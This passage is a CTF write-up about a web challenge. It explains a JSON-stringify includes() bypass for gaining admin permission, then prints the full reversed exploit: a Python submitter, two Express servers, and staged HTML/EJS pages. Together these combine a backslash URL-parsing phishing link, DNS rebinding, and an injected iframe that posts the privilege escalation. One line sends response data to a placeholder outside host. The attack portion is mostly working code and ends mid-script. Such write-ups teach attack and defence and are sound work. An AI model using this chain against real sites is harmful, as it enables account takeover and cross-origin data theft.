<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/promote</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">permission</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">permission</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">user</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">permission</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"error":"Bad Request"}</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">permission</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">administrator</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"error":"Not allowed"}</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="kd">const</span> <span class="nx">currentPermissions</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">((</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">user</span><span class="p">)).</span><span class="nx">permissions</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">newPermissions</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">([...</span><span class="nx">currentPermissions</span><span class="p">,</span> <span class="nx">permission</span><span class="p">]);</span>
    <span class="nx">User</span><span class="p">.</span><span class="nx">editPermission</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">newPermissions</span><span class="p">).</span><span class="nx">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{}</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}).</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"error":"Internal Server Error"}</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>Apparently a moderator can promote an arbitrary user, giving the username. However the permission cannot include the administrator keyword.</p>

<p>Here is where the last magic happens. We pass the permission as a string, but then is stringified as an <mark class="hltr-orange">array</mark>. 
Later, when we try to hit the admin endpoint the <mark class="hltr-orange">string representation of the array</mark> is used to check if the administrator permission is present.
Did you notice the difference here? No? Me neither during the competition, but apparently there is.</p>

<p>The <code class="language-plaintext highlighter-rouge">includes</code> function behaves differently on the string representation of an array than on a simple string.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="dl">"</span><span class="se">\</span><span class="s2">u001administrator</span><span class="dl">"</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">administrator</span><span class="dl">"</span><span class="p">)</span>
<span class="o">&lt;</span> <span class="kc">false</span>
<span class="o">&gt;</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">([</span><span class="dl">"</span><span class="se">\</span><span class="s2">u001administrator</span><span class="dl">"</span><span class="p">]).</span><span class="nx">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">administrator</span><span class="dl">"</span><span class="p">)</span>
<span class="o">&lt;</span> <span class="kc">true</span>
</code></pre></div></div>

<p>So, if we supply something like <code class="language-plaintext highlighter-rouge">\u001administrator</code> (but i guess it could be also <code class="language-plaintext highlighter-rouge">administratorr</code>) we can make false the first check, and true the second one.
This allow us to promote our user to admin, and finally <mark class="hltr-orange">get the flag</mark>.</p>

<h2 id="phished-the-phishable-rebinded-the-rebindable-js-tricked-the-js-trickable">Phished the phishable. Rebinded the rebindable. JS tricked the JS trickable.</h2>

<p>Now we have everything we need. Let’s recap everything. We just need to setup two domains:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">exploit.blig.one</code> points to our exploit server (i’ve used a VPS)</li>
  <li><code class="language-plaintext highlighter-rouge">local.blig.one</code> responds with two A records, one is local to the bot and the other is the exploit server</li>
</ul>

<p>Moreover on our exploit domain there will be two server running:</p>

<ul>
  <li>At port 9999 there will be the starter of our chain. Its purpose is to kick off the exploit</li>
  <li>At port 3000 there will be our crasher server. The one responsible for crashing at a certain point in order to perform the DNS Rebinding magic</li>
</ul>

<p>Once we have those setup we can go on with the exploit chain:</p>

<ul>
  <li>Phish the admin via the parsing differential to <code class="language-plaintext highlighter-rouge">http://exploit.blig.one:9999/</code></li>
  <li><code class="language-plaintext highlighter-rouge">http://exploit.blig.one:9999/</code> will kick-off the first stage of our exploit. Which is a simple HTML page that will open another HTML page</li>
  <li>The newly opened HTML page is the <mark class="hltr-orange">stage-2</mark> of our exploit. This will redirect the opener window (the stage 1) to <code class="language-plaintext highlighter-rouge">http://local.blig.one:3000/login</code>. This will lead the bot to the login on the challenge page</li>
  <li>We wait for some time, in order to make the bot login normally. At this step it could be helpful to perform some dummy fetch operation in order to <mark class="hltr-orange">saturate</mark> the Chrome cache, and avoid any problems related to caching.</li>
  <li>After the waiting, from the <mark class="hltr-orange">stage-2 window</mark> we redirect the now login window to <code class="language-plaintext highlighter-rouge">http://local.blig.one:3000/moderator/logs</code>. This should crash the challenge server and make the same request to our exploit server. This will kick-off the stage 3.</li>
  <li>The stage 3 is responsible for <mark class="hltr-orange">crashing</mark> our own server and injecting the iframe with the fetch to the <code class="language-plaintext highlighter-rouge">/moderator/promote</code> endpoint with the <code class="language-plaintext highlighter-rouge">\u001administrator</code> payload</li>
  <li>After this is possible to login normally with our user, and retrieve the flag.</li>
</ul>

<h2 id="the-reversed-exploit">The Reversed Exploit</h2>

<p>All of this could not have been possible without the <mark class="hltr-orange">pilvar's writeup</mark> (and obviously with pilvar explaining me things)</p>

<p>Since i’ve fully reversed the exploit, i left here all the different stages and files needed to flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># This is the submitter script.
# Its only purpose is to create the user, the post with the exploit and send everything to the admin.
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">CHALLENGE_URL</span> <span class="o">=</span> <span class="s">"http://localhost:12008"</span>
<span class="n">REPORT_URL</span> <span class="o">=</span> <span class="s">"http://localhost:12009"</span>

<span class="c1"># This URL resolves to where the backend of our exploit relies.
</span><span class="n">EXPLOIT_URL_TWO</span> <span class="o">=</span> <span class="s">"http://exploit.blig.one"</span>

<span class="c1"># Step 1. Create the user and perform the login.
</span>
<span class="k">def</span> <span class="nf">randomString</span><span class="p">(</span><span class="n">stringLength</span><span class="o">=</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">stringLength</span><span class="p">))</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">username</span> <span class="o">=</span> <span class="n">randomString</span><span class="p">()</span>
<span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">CHALLENGE_URL</span><span class="si">}</span><span class="s">/register"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">})</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">json</span><span class="p">()[</span><span class="s">"password"</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s"> Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">EXPLOIT_URL_TWO</span><span class="si">}</span><span class="s">:3000/username?username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Username sent to exploit server"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">CHALLENGE_URL</span><span class="si">}</span><span class="s">/login"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">})</span>

<span class="c1"># Step 2. Create the post with the exploit.
#
# The exploit is subtle. We inject an anchor tag which will be clicked by the admin because it contains [Login to view this content].
# We need to bypass the host check.
# The host check is performed in this way:
#
# const { parse } = require('tldts');
# if (parse(a.href).hostname !== parse(req.headers.host).hostname &amp;&amp; !isAuth) {
#   a.text = "[Login to view this content]"
#   a.href = "/login";
# }
#
# We need a way to trick the parser to think that we want the admin to click a safe link, but in reality is not.
# The way we can do it is by using the backslash char (\).
# Why? Because in javascript is treated as it is, while on chrome it gets converted to forward slash (/) when used in a link.
# This lead to a parser differential where the admin is phished to our domain.
#
</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"title"</span><span class="p">:</span><span class="s">"exploit"</span><span class="p">,</span>
    <span class="s">"content"</span><span class="p">:</span><span class="sa">f</span><span class="s">"""
        &lt;a href='</span><span class="se">\\\\</span><span class="si">{</span><span class="n">EXPLOIT_URL_TWO</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"http://"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span><span class="si">}</span><span class="s">:9999</span><span class="se">\\</span><span class="s">x@fishing-web:3000/../'&gt;[Login to view this content]&lt;/a&gt;
    """</span>
<span class="p">}</span>

<span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">CHALLENGE_URL</span><span class="si">}</span><span class="s">/posts"</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="n">postId</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">json</span><span class="p">()[</span><span class="s">"postId"</span><span class="p">]</span>

<span class="c1"># Step 3. Submit the post to the admin.
</span>
<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">REPORT_URL</span><span class="si">}</span><span class="s">/submit"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"postId"</span><span class="p">:</span><span class="n">postId</span><span class="p">})</span>

<span class="k">print</span><span class="p">(</span><span class="n">postId</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Now waiting for the admin to do all the stuff, hopefully we flag"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">CHALLENGE_URL</span><span class="si">}</span><span class="s">/admin/flag"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p>Below the two server used.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">)</span>

<span class="cm">/** 
 * This is the first out of two servers that we need to run in order to make our exploit work.
 * The whole purpose of this is to kick off the first stage of the exploit, that would lead to the second one.
 * Essentially this is serving files.
 */</span>

<span class="kd">const</span> <span class="nx">starter</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kd">var</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="nx">starter</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Stage 1 starting</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">public/stage-1.html</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">{</span><span class="na">encoding</span><span class="p">:</span> <span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">data</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">text/html</span><span class="dl">'</span><span class="p">});</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">})</span>

<span class="nx">starter</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/stage-two</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Stage 2 kicking in</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">public/stage-2.html</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="p">{</span><span class="na">encoding</span><span class="p">:</span> <span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">data</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">text/html</span><span class="dl">'</span><span class="p">});</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">})</span>

<span class="nx">starter</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Starter listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">})</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/** 
 * This is the second out of two servers that we need to run in order to make our exploit work.
 * The whole purpose of this is to kick off the third stage of the exploit.
 * In addition it has an endpoint that will make crash the entire application.
 * In addition it has a route that serve just for setting the username.
 * This is necessary to achieve a SOP bypass.
 */</span>

<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">crasher</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="nx">crasher</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>
<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="dl">""</span>

<span class="nx">crasher</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/username</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">username</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">()</span>
<span class="p">})</span>

<span class="nx">crasher</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/moderator/logs</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">../public/stage-3.ejs</span><span class="dl">"</span><span class="p">,{</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span><span class="nx">username</span><span class="p">})</span>
<span class="p">})</span>

<span class="nx">crasher</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/bye</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Stage 3 Started, killing this process</span><span class="dl">"</span><span class="p">)</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">crasher</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Crasher listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Last but not least all the HTML files used as stages</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>Stage 1 of the Exploit<span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;p&gt;</span>
            The only thing that this exploit does is to open the second stage.
        <span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;br/&gt;</span>
        <span class="nt">&lt;p&gt;</span>
            We need a dedicated page in order to redirect this page to /login, to bypass
            the check performed by the bot.
        <span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">var</span> <span class="nx">tab</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">/stage-two</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="p">)</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>

        <span class="k">async</span> <span class="kd">function</span> <span class="nx">exploit</span><span class="p">(){</span>
            <span class="cm">/* 
            * This changes the location of the opener (which is stage-1) to the login page.
            * Actually the URL sends two DNS A-Record, one for the challenge server and the other one for the exploit server.
            * The admin will land on the challenge page, because Chrome will prefer the local address over the remote one. 
            * Maybe since there are some DNS caching magic happening we can try to saturate the cache with random fetch in order to make the exploit more reliable.
            * The request to /moderator/logs will make the server crash. The browser will then perform the request to the other address as fallback.
            * On the other address there will be the third stage.
            */</span>
            <span class="nx">opener</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://local.blig.one:3000/login</span><span class="dl">"</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">60</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
                <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/nonexisting</span><span class="dl">'</span><span class="o">+</span><span class="nx">i</span><span class="p">)</span>
	    <span class="p">}</span>
            <span class="nx">opener</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://local.blig.one:3000/moderator/logs</span><span class="dl">"</span>
        <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;head&gt;</span>Stage 2 of the Exploit<span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"exploit()"</span><span class="nt">&gt;&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>The last one is actually an ejs template.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>Stage 3 of the Exploit<span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>

        <span class="kd">function</span> <span class="nx">injectFunc</span><span class="p">(){</span>
            <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/moderator/promote</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
                    <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
                    <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
                        <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span>
                    <span class="p">},</span>
                    <span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="na">username</span><span class="p">:</span> <span class="dl">"</span><span class="s2">&lt;%= username %&gt;</span><span class="dl">"</span><span class="p">,</span> <span class="na">permission</span><span class="p">:</span> <span class="dl">"</span><span class="se">\</span><span class="s2">u001administrator</span><span class="dl">"</span><span class="p">})</span>
                <span class="p">}</span>
            <span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">e</span><span class="o">=&gt;</span><span class="nx">e</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">e</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://dummy-domain-for-debug/?a=</span><span class="dl">'</span><span class="o">+</span><span class="nx">e</span><span class="p">)})</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nx">injectScript</span><span class="p">(</span><span class="nx">frame</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">doc</span> <span class="o">=</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">contentDocument</span> <span class="o">||</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span>
            <span class="kd">let</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)</span>
            <span class="nx">iframe</span><span class="p">.</span><span class="nx">srcdoc</span> <span class="o">=</span> <span class="s2">`&lt;script&gt;</span><span class="p">${</span><span class="nx">injectFunc</span><span class="p">.</span><span class="nx">toString</span><span class="p">()}</span><span class="s2">; injectFunc()&lt;\x2fscript&gt;`</span>
            <span class="nx">doc</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">iframe</span><span class="p">)</span>
        <span class="p">}</span>

        <span class="k">async</span> <span class="kd">function</span> <span class="nx">pwn</span><span class="p">(){</span>
            <span class="cm">/**
             * This fetch will kill our DNS Rebinding server.
             * This is because we need to perform the request in same-origin with the challenge server.
             * By killing our server, the request will go to the other A Record (which is the challenge URL).
             * Once again maybe we need to saturate the cache with some dummy fetch.
             * Then we can inject a script into the iframe.
            */</span>
            <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bye</span><span class="dl">"</span><span class="p">)</span>
